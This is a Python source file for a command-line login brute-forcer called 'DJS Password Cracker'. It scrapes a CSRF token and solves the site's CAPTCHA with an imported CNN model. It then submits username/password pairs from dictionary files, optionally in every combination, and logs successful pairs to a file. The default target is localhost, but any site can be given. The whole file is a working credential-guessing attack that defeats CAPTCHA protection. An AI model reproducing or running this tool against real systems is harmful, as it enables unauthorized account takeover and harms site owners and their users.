from optparse import OptionParser
import os
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm

try:
    from app.util.captcha_break import predict_image
except Exception:
    import sys

    _file_abspath = os.path.abspath(__file__)
    sys.path.append(os.path.dirname(os.path.dirname(_file_abspath)))
    print(sys.path)
    from app.util.captcha_break import predict_image


def check_successfully(content):
    soup = BeautifulSoup(content, 'lxml')
    warning = soup.body.find_all(attrs={'class': 'alert alert-warning'})
    if "成功" in warning[0].text.split()[1]:
        return True
    return False


def get_captcha(image_name):
    code = predict_image(image_name, model_path="../model/cnn.h5")
    return code


def crack(site, username, password):
    s = requests.Session()
    page_content = s.get(site).content  # 获得 Session

    soup = BeautifulSoup(page_content, 'lxml')
    csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']

    # 获得验证码的值
    image_data = s.get(site + 'get_captcha').content
    image_name = 'image' + csrf + '.png'
    with open(image_name, 'wb') as image_file:
        image_file.write(image_data)
    captcha_code = get_captcha(image_name)
    os.remove(image_name)

    response = s.post(site + 'login', data={'csrf_token': csrf, 
                                            'username': username, 
                                            'password': password, 'captcha_code': captcha_code, 'submit': 'Login'})
    if check_successfully(response.content.decode()):
        return True, username, password
    return False, username, password


if __name__ == '__main__':
    usage = "Using cracker.py to break login by brute force."
    parser = OptionParser(usage)
    parser.add_option('-s', '--site', dest="site", type="string")
    parser.add_option('-d', '--dict', dest="data_dict", type="string")
    parser.add_option('-u', '--user', dest="user_dict", type="string")
    parser.add_option('-p', '--pass', dest="pass_dict", type="string")
    parser.add_option('-o', '--out', dest="out_file", type="string")
    parser.add_option('-c', action="store_true", dest="cross")

    options, args = parser.parse_args()

    site = options.site
    if site is None:
        site = 'http://127.0.0.1:5000/'
    if site[-1] != '/':
        site += '/'

    out_file = options.out_file
    if out_file is None:
        out_file = './default_out'

    data_dict_path = options.data_dict

    user_dict_path = None
    pass_dict_path = None

    username_list = []
    password_list = []
    if data_dict_path is None:
        user_dict_path = options.user_dict
        pass_dict_path = options.pass_dict
        if user_dict_path is None or pass_dict_path is None:
            print("You should specify target dict by -d or --dict\nOr you can specify user by -u with password by -p")
            exit(-1)
        if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
            print("File %s or %s not found." % (data_dict_path, pass_dict_path))
            exit(-1)
        with open(user_dict_path, 'r', encoding='utf-8') as user_dict:
            users = user_dict.read()
            username_list = users.split('\n')
        with open(pass_dict_path, 'r', encoding='utf-8') as pass_dict:
            passwords = pass_dict.read()
            password_list = passwords.split('\n')
    else:
        if not os.path.exists(data_dict_path):
            print("File %s not found." % data_dict_path)
            exit(-1)
        with open(data_dict_path, 'r', encoding='utf-8') as data_dict:
            data = data_dict.read()
            lines = data.split('\n')
            for line in lines:
                if len(line) > 2:
                    username = line.split(' ')[0]
                    password = line.split(' ')[1]
                    username_list.append(username)
                    password_list.append(password)

    print('''
  ____        _      ____     
 |  _"\    U |"| u  / __"| u  
/| | | |  _ \| |/  <\___ \/   
U| |_| |\| |_| |_,-.u___) |   
 |____/ u \___/-(_/ |____/>>  
  |||_     _//       )(  (__) 
 (__)_)   (__)      (__)      
    ''')
    print('WELCOME TO DJS PASSWORD CRACKER!')
    print('Your target site is \033[1;34;40m%s\033[0m' % site)
    print('Now the process of crack will begin, please wait for a minute...')
    print('NOTE: You can stop this process any time you want, and the results will write in \033[1;32;40m%s\033[0m\n\n' % out_file)
    out = open(out_file, 'w')
    match_count = 0
    if options.cross:
        total_count = len(username_list) * len(password_list)
        pbar = tqdm(total=total_count)
        pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
        for username in username_list:
            if len(username) <= 1:
                pbar.update(len(password_list))
                continue
            for password in password_list:
                pbar.update(1)
                if len(password) <= 1:
                    continue
                result, _, _ = crack(site, username, password)
                if result:
                    match_count += 1
                    pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
                    out.write(username + ' --- ' + password + '\n')
    else:
        total_count = len(username_list)
        pbar = tqdm(total=total_count)
        pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
        for index in range(len(username_list)):
            pbar.update(1)
            username = username_list[index]
            password = password_list[index]
            if len(username) <= 1 or len(password) <= 1:
                continue
            result, _, _ = crack(site, username, password)
            if result:
                match_count += 1
                pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
                out.write(username + ' --- ' + password + '\n')
    out.close()
